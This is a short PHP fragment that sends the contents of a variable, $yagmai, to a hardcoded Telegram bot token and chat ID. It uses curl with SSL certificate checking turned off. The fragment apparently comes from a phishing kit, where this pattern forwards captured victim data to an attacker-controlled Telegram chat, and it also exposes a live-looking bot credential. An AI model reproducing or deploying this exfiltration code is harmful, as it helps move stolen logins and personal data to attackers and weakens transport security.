<?php 
  $website="https://api.telegram.org/bot8269477061:AAH7wOm3U-7vyNrR0zOs1ZCjCPJxcW08-Yk";
  $params=[
      'chat_id'=>"-4696319306",
      'text'=>$yagmai,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);